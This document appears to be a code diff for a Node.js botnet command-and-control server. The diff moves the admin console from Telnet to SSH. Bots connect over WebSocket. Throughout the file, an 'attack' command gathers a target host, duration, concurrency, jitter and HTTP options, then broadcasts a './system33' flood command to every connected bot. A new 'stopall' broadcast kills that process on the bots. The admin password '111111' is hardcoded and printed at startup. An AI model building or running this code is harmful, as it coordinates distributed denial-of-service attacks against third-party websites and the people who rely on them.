@@ -2,17 +2,46 @@
 /**
  * WebSocket System Server
  * Supports:
- * - Admin connections via Telnet
+ * - Admin connections via SSH
  * - Bot connections via WebSocket
  */
 
-const net = require('net');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+const { Server: SSHServer } = require('ssh2');
 const { WebSocketServer } = require('ws');
 
 // Configuration
-const TELNET_PORT = 8023;
+const SSH_PORT = 8023;
 const WEBSOCKET_PORT = 8765;
+const ADMIN_USERNAME = 'admin';
 const ADMIN_PASSWORD = '111111';
+
+// Generate or load SSH host key
+const HOST_KEY_PATH = path.join(__dirname, 'ssh_host_key');
+let hostKey;
+
+if (fs.existsSync(HOST_KEY_PATH)) {
+    hostKey = fs.readFileSync(HOST_KEY_PATH);
+    console.log('[INFO] Loaded existing SSH host key');
+} else {
+    // Generate a new RSA key pair
+    const { privateKey } = crypto.generateKeyPairSync('rsa', {
+        modulusLength: 2048,
+        privateKeyEncoding: {
+            type: 'pkcs1',
+            format: 'pem'
+        },
+        publicKeyEncoding: {
+            type: 'pkcs1',
+            format: 'pem'
+        }
+    });
+    hostKey = privateKey;
+    fs.writeFileSync(HOST_KEY_PATH, hostKey);
+    console.log('[INFO] Generated new SSH host key');
+}
 
 /**
  * Connection Manager
@@ -130,192 +159,252 @@ class ConnectionManager {
 const manager = new ConnectionManager();
 
 /**
- * Handle admin telnet connection
+ * Handle admin SSH connection
  */
-function handleAdminConnection(socket) {
-    const addr = `${socket.remoteAddress}:${socket.remotePort}`;
-    console.log(`[INFO] Admin connection from ${addr}`);
+function handleAdminConnection(client) {
+    const clientInfo = client._sock.remoteAddress + ':' + client._sock.remotePort;
+    console.log(`[INFO] SSH connection from ${clientInfo}`);
 
+    let stream = null;
     let isAuthenticated = false;
-    let passwordBuffer = '';
     let attackMode = false;
     let attackParams = {};
     let currentParam = '';
 
-    // Send password prompt
-    socket.write('Password: ');
-
-    // Welcome message (shown after authentication)
-    const welcome = 
-        '============================================================\r\n' +
-        'WebSocket System - Admin Console\r\n' +
-        '============================================================\r\n' +
-        'Commands:\r\n' +
-        '  attack                - Launch attack (prompts for parameters)\r\n' +
-        '  bots                  - Show number of connected bots\r\n' +
-        '  list                  - List all connected bots\r\n' +
-        '  stats                 - Show connection statistics\r\n' +
-        '  help                  - Show this help message\r\n' +
-        '============================================================\r\n' +
-        'Note: All messages are automatically sent to ALL bots.\r\n' +
-        'Admin connection is persistent. Close terminal to disconnect.\r\n' +
-        '============================================================\r\n';
-
-    let buffer = '';
-
-    socket.on('data', (data) => {
-        // Handle password authentication
-        if (!isAuthenticated) {
-            passwordBuffer += data.toString();
-            
-            // Check for newline (password submitted)
-            const newlineIndex = passwordBuffer.indexOf('\n');
-            if (newlineIndex !== -1) {
-                const password = passwordBuffer.substring(0, newlineIndex).replace(/\r$/, '').trim();
-                passwordBuffer = '';
-                
-                if (password === ADMIN_PASSWORD) {
-                    isAuthenticated = true;
-                    manager.addAdmin(socket);
-                    socket.write('\x1b[2J\x1b[H');
-                    // Show authentication success message
-                    socket.write('\r\nAuthentication successful!\r\n');
-                    
-                    // Wait 3 seconds, then clear screen and show welcome
-                    setTimeout(() => {
-                        socket.write('\x1b[2J\x1b[H'); // Clear screen and move cursor to home
-                        socket.write(welcome);
-                        socket.write('admin> ');
-                    }, 3000);
-                } else {
-                    socket.write('\r\nAuthentication failed. Disconnecting...\r\n');
-                    console.log(`[WARN] Failed authentication attempt from ${addr}`);
-                    socket.end();
-                }
-            }
-            return;
-        }
-
-        buffer += data.toString();
-
-        // Process complete lines
-        let newlineIndex;
-        while ((newlineIndex = buffer.indexOf('\n')) !== -1) {
-            const line = buffer.substring(0, newlineIndex).replace(/\r$/, '');
-            buffer = buffer.substring(newlineIndex + 1);
-
-            const command = line.trim();
-            if (!command) {
-                if (attackMode) {
-                    socket.write(`${currentParam}> `);
-                } else {
-                    socket.write('admin> ');
-                }
-                continue;
-            }
-
-            // Handle attack parameter collection
-            if (attackMode) {
-                attackParams[currentParam] = command;
-                
-                const paramOrder = ['HOST', 'TIME', 'CONCURRENCY', 'HTTP-METHOD', 'ADAPTIVE-DELAY', 'JITTER', 'HTTP-PROTOCOL', 'BURST', 'RANDOM-PATH'];
-                const currentIndex = paramOrder.indexOf(currentParam);
-                
-                if (currentIndex < paramOrder.length - 1) {
-                    // Move to next parameter
-                    currentParam = paramOrder[currentIndex + 1];
-                    socket.write(`${currentParam}> `);
-                } else {
-                    // All parameters collected, send attack command
-                    attackMode = false;
-                    
-                    const attackCommand = `./system33 --url ${attackParams.HOST} --duration ${attackParams.TIME} --http-method ${attackParams['HTTP-METHOD']} --jitter ${attackParams.JITTER} --http-protocol ${attackParams['HTTP-PROTOCOL']} --adaptive-delay ${attackParams['ADAPTIVE-DELAY']}`;
-                    
-                    socket.write('\r\n');
-                    socket.write('Attack command prepared:\r\n');
-                    socket.write(`${attackCommand}\r\n`);
-                    socket.write('\r\n');
-                    socket.write(`Sending to ${manager.botConnections.size} bots...\r\n`);
-                    
-                    // Send to all bots
-                    manager.broadcastToBots({
-                        type: 'attack',
-                        message: attackCommand,
-                        params: attackParams,
-                        timestamp: new Date().toISOString()
-                    });
-                    
-                    socket.write(`Attack command sent to ${manager.botConnections.size} bots!\r\n`);
-                    socket.write('admin> ');
-                    
-                    // Reset attack params
-                    attackParams = {};
-                    currentParam = '';
-                }
-                continue;
-            }
-
-            // Process commands
-            if (command.toLowerCase() === 'attack') {
-                socket.write('\x1b[2J\x1b[H');
-                socket.write('============================================================\r\n');
-                socket.write('ATTACK MODE\r\n');
-                socket.write('============================================================\r\n');
-                socket.write('Please provide the following parameters:\r\n');
-                socket.write('\r\n');
-                
-                attackMode = true;
-                attackParams = {};
-                currentParam = 'HOST';
-                socket.write(`${currentParam}> `);
-            } else if (command.toLowerCase() === 'help') {
-                socket.write('\x1b[2J\x1b[H');
-                socket.write(welcome);
-            } else if (command.toLowerCase() === 'bots') {
-                socket.write('\x1b[2J\x1b[H');
-                const stats = manager.getStats();
-                socket.write(`Connected bots: ${stats.bots}\r\n`);
-            } else if (command.toLowerCase() === 'list') {
-                socket.write('\x1b[2J\x1b[H');
-                const stats = manager.getStats();
-                let response = `Connected bots (${stats.bots}):\r\n`;
-                stats.bot_ids.forEach(botId => {
-                    response += `  - ${botId}\r\n`;
-                });
-                socket.write(response);
-            } else if (command.toLowerCase() === 'stats') {
-                socket.write('\x1b[2J\x1b[H');
-                const stats = manager.getStats();
-                const response = 
-                    'Connection Statistics:\r\n' +
-                    `  Admins: ${stats.admins}\r\n` +
-                    `  Bots: ${stats.bots}\r\n`;
-                socket.write(response);
+    client.on('authentication', (ctx) => {
+        if (ctx.method === 'password') {
+            if (ctx.username === ADMIN_USERNAME && ctx.password === ADMIN_PASSWORD) {
+                console.log(`[INFO] SSH authentication successful for ${ctx.username} from ${clientInfo}`);
+                isAuthenticated = true;
+                ctx.accept();
             } else {
-                // Send all other messages to all bots
-                manager.broadcastToBots({
-                    type: 'message',
-                    message: command,
-                    timestamp: new Date().toISOString()
-                });
-                socket.write(`Sent to ${manager.botConnections.size} bots\r\n`);
+                console.log(`[WARN] SSH authentication failed for ${ctx.username} from ${clientInfo}`);
+                ctx.reject();
             }
+        } else {
+            ctx.reject();
         }
     });
 
-    socket.on('error', (error) => {
-        console.error(`[ERROR] Error in admin connection: ${error.message}`);
+    client.on('ready', () => {
+        console.log(`[INFO] SSH client ready: ${clientInfo}`);
+
+        client.on('session', (accept) => {
+            const session = accept();
+
+            session.on('pty', (accept) => {
+                accept();
+            });
+
+            session.on('shell', (accept) => {
+                stream = accept();
+                manager.addAdmin(stream);
+
+                // Welcome message
+                const welcome = 
+                    '============================================================\r\n' +
+                    'WebSocket System - Admin Console (SSH)\r\n' +
+                    '============================================================\r\n' +
+                    'Commands:\r\n' +
+                    '  attack                - Launch attack (prompts for parameters)\r\n' +
+                    '  bots                  - Show number of connected bots\r\n' +
+                    '  list                  - List all connected bots\r\n' +
+                    '  stats                 - Show connection statistics\r\n' +
+                    '  help                  - Show this help message\r\n' +
+                    '============================================================\r\n' +
+                    'Note: All messages are automatically sent to ALL bots.\r\n' +
+                    'Admin connection is persistent. Close terminal to disconnect.\r\n' +
+                    '============================================================\r\n';
+
+                stream.write('\x1b[2J\x1b[H');
+                stream.write('\r\nAuthentication successful!\r\n');
+                
+                setTimeout(() => {
+                    stream.write('\x1b[2J\x1b[H');
+                    stream.write(welcome);
+                    stream.write('admin> ');
+                }, 1000);
+
+                let buffer = '';
+
+                stream.on('data', (data) => {
+                    // Echo the input back to the client for visibility
+                    const input = data.toString();
+                    
+                    // Handle special characters
+                    for (let i = 0; i < input.length; i++) {
+                        const char = input[i];
+                        const charCode = input.charCodeAt(i);
+                        
+                        // Handle backspace (ASCII 127 or 8)
+                        if (charCode === 127 || charCode === 8) {
+                            if (buffer.length > 0) {
+                                buffer = buffer.slice(0, -1);
+                                stream.write('\b \b'); // Erase character on screen
+                            }
+                            continue;
+                        }
+                        
+                        // Handle Ctrl+C (ASCII 3)
+                        if (charCode === 3) {
+                            if (attackMode) {
+                                attackMode = false;
+                                attackParams = {};
+                                currentParam = '';
+                                stream.write('\r\n^C\r\n');
+                                stream.write('admin> ');
+                                buffer = '';
+                            }
+                            continue;
+                        }
+                        
+                        // Handle carriage return or newline
+                        if (char === '\r' || char === '\n') {
+                            // Skip if we already processed this line
+                            if (char === '\n' && input[i-1] === '\r') {
+                                continue;
+                            }
+                            
+                            stream.write('\r\n'); // Move to new line
+                            
+                            const command = buffer.trim();
+                            buffer = ''; // Clear buffer
+                            if (!command) {
+                                if (attackMode) {
+                                    stream.write(`${currentParam}> `);
+                                } else {
+                                    stream.write('admin> ');
+                                }
+                                continue;
+                            }
+
+                            // Handle attack parameter collection
+                            if (attackMode) {
+                                attackParams[currentParam] = command;
+                                
+                                const paramOrder = ['HOST', 'TIME', 'CONCURRENCY', 'HTTP-METHOD', 'ADAPTIVE-DELAY', 'JITTER', 'HTTP-PROTOCOL', 'BURST', 'RANDOM-PATH'];
+                                const currentIndex = paramOrder.indexOf(currentParam);
+                                
+                                if (currentIndex < paramOrder.length - 1) {
+                                    // Move to next parameter
+                                    currentParam = paramOrder[currentIndex + 1];
+                                    stream.write(`${currentParam}> `);
+                                } else {
+                                    // All parameters collected, send attack command
+                                    attackMode = false;
+                                    
+                                    const attackCommand = `./system33 --url ${attackParams.HOST} --duration ${attackParams.TIME} --http-method ${attackParams['HTTP-METHOD']} --jitter ${attackParams.JITTER} --http-protocol ${attackParams['HTTP-PROTOCOL']} --adaptive-delay ${attackParams['ADAPTIVE-DELAY']}`;
+                                    
+                                    stream.write('\r\n');
+                                    stream.write(`Sending to ${manager.botConnections.size} bots...\r\n`);
+                                    
+                                    // Send to all bots
+                                    manager.broadcastToBots({
+                                        type: 'attack',
+                                        message: attackCommand,
+                                        params: attackParams,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                    
+                                    stream.write(`Attack command sent to ${manager.botConnections.size} bots!\r\n`);
+                                    stream.write('admin> ');
+                                    
+                                    // Reset attack params
+                                    attackParams = {};
+                                    currentParam = '';
+                                }
+                                continue;
+                            }
+
+                            // Process commands
+                            if (command.toLowerCase() === 'attack') {
+                                stream.write('\x1b[2J\x1b[H');
+                                stream.write('============================================================\r\n');
+                                stream.write('ATTACK MODE\r\n');
+                                stream.write('============================================================\r\n');
+                                stream.write('Please provide the following parameters:\r\n');
+                                stream.write('\r\n');
+                                
+                                attackMode = true;
+                                attackParams = {};
+                                currentParam = 'HOST';
+                                stream.write(`${currentParam}> `);
+                            } else if (command.toLowerCase() === 'help') {
+                                stream.write('\x1b[2J\x1b[H');
+                                stream.write(welcome);
+                                stream.write('admin> ');
+                            } else if (command.toLowerCase() === 'bots') {
+                                stream.write('\x1b[2J\x1b[H');
+                                const stats = manager.getStats();
+                                stream.write(`Connected bots: ${stats.bots}\r\n`);
+                                stream.write('admin> ');
+                            } else if (command.toLowerCase() === 'list') {
+                                stream.write('\x1b[2J\x1b[H');
+                                const stats = manager.getStats();
+                                let response = `Connected bots (${stats.bots}):\r\n`;
+                                stats.bot_ids.forEach(botId => {
+                                    response += `  - ${botId}\r\n`;
+                                });
+                                stream.write(response);
+                                stream.write('admin> ');
+                            } else if (command.toLowerCase() === 'stats') {
+                                stream.write('\x1b[2J\x1b[H');
+                                const stats = manager.getStats();
+                                const response = 
+                                    'Connection Statistics:\r\n' +
+                                    `  Admins: ${stats.admins}\r\n` +
+                                    `  Bots: ${stats.bots}\r\n`;
+                                stream.write(response);
+                                stream.write('admin> ');
+                            } else if (command.toLowerCase() === 'stopall') {
+                                 manager.broadcastToBots({
+                                    type: 'stop',
+                                    message: 'killall system33 ; pkill -9 system33 ; kill -9 system33',
+                                    timestamp: new Date().toISOString()
+                                });
+                                stream.write(`Sent to ${manager.botConnections.size} bots\r\n`);
+                                stream.write('admin> ');
+                            } else {
+                                // Send all other messages to all bots
+                                manager.broadcastToBots({
+                                    type: 'message',
+                                    message: command,
+                                    timestamp: new Date().toISOString()
+                                });
+                                stream.write(`Sent to ${manager.botConnections.size} bots\r\n`);
+                                stream.write('admin> ');
+                            }
+                            continue;
+                        }
+                        
+                        // Echo regular characters
+                        if (charCode >= 32 && charCode <= 126) {
+                            buffer += char;
+                            stream.write(char);
+                        }
+                    }
+                });
+
+                stream.on('error', (error) => {
+                    console.error(`[ERROR] Error in SSH stream: ${error.message}`);
+                });
+
+                stream.on('close', () => {
+                    if (stream) {
+                        manager.removeAdmin(stream);
+                    }
+                    console.log(`[INFO] SSH stream closed: ${clientInfo}`);
+                });
+            });
+        });
     });
 
-    // Keep connection alive with TCP keepalive
-    socket.setKeepAlive(true, 60000); // 60 seconds
-    socket.setTimeout(0); // Disable timeout
+    client.on('error', (error) => {
+        console.error(`[ERROR] SSH client error: ${error.message}`);
+    });
 
-    socket.on('close', () => {
-        if (isAuthenticated) {
-            manager.removeAdmin(socket);
-        }
-        console.log(`[INFO] Admin connection closed: ${addr}`);
+    client.on('close', () => {
+        console.log(`[INFO] SSH client disconnected: ${clientInfo}`);
     });
 }
 
@@ -344,9 +433,6 @@ function handleBotConnection(websocket) {
             try {
                 const message = JSON.parse(data.toString());
                 console.log(`[INFO] Message from ${botId}:`, message);
-                
-                // Log message to file
-                logMessage(botId, message);
 
                 // Forward bot messages to admins
                 // manager.broadcastToAdmins(
@@ -389,13 +475,16 @@ function handleBotConnection(websocket) {
 }
 
 /**
- * Start both telnet and WebSocket servers
+ * Start both SSH and WebSocket servers
  */
 function main() {
-    // Start telnet server for admin (port 8023)
-    const telnetServer = net.createServer(handleAdminConnection);
-    telnetServer.listen(TELNET_PORT, '0.0.0.0', () => {
-        console.log(`[INFO] Admin telnet server started on port ${TELNET_PORT}`);
+    // Start SSH server for admin (port 2222)
+    const sshServer = new SSHServer({
+        hostKeys: [hostKey]
+    }, handleAdminConnection);
+
+    sshServer.listen(SSH_PORT, '0.0.0.0', () => {
+        console.log(`[INFO] Admin SSH server started on port ${SSH_PORT}`);
     });
 
     // Start WebSocket server for bots (port 8765)
@@ -410,7 +499,8 @@ function main() {
         console.log(`[INFO] Bot WebSocket server started on port ${WEBSOCKET_PORT}`);
         console.log('============================================================');
         console.log('WebSocket System is running!');
-        console.log(`Admin: telnet localhost ${TELNET_PORT}`);
+        console.log(`Admin: ssh ${ADMIN_USERNAME}@localhost -p ${SSH_PORT}`);
+        console.log(`Password: ${ADMIN_PASSWORD}`);
         console.log(`Bots: ws://localhost:${WEBSOCKET_PORT}`);
         console.log('============================================================');
     });
@@ -419,14 +509,14 @@ function main() {
         console.error(`[ERROR] WebSocket server error: ${error.message}`);
     });
 
-    telnetServer.on('error', (error) => {
-        console.error(`[ERROR] Telnet server error: ${error.message}`);
+    sshServer.on('error', (error) => {
+        console.error(`[ERROR] SSH server error: ${error.message}`);
     });
 
     // Handle shutdown
     process.on('SIGINT', () => {
         console.log('\n[INFO] Server stopped by user');
-        telnetServer.close();
+        sshServer.close();
         wss.close();
         process.exit(0);
     });
